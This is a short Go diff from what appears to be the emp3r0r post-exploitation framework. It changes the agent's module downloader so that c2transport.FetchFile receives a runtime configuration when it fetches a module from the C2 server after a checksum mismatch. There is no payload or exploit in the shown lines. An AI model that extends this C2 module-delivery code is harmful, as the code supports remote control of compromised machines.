@@ -10,6 +10,7 @@ import (
 	"github.com/jm33-m0/arc/v2"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/exeutil"
@@ -87,7 +88,7 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 
 func downloadAndVerifyModule(file_to_download, checksum, download_addr string) (data []byte, err error) {
 	if crypto.SHA256SumFile(file_to_download) != checksum {
-		if data, err = c2transport.FetchFile(download_addr, file_to_download, "", checksum); err != nil {
+		if data, err = c2transport.FetchFile(common.RuntimeConfig, download_addr, file_to_download, "", checksum); err != nil {
 			return nil, fmt.Errorf("downloading %s: %v", file_to_download, err)
 		}
 	} else {
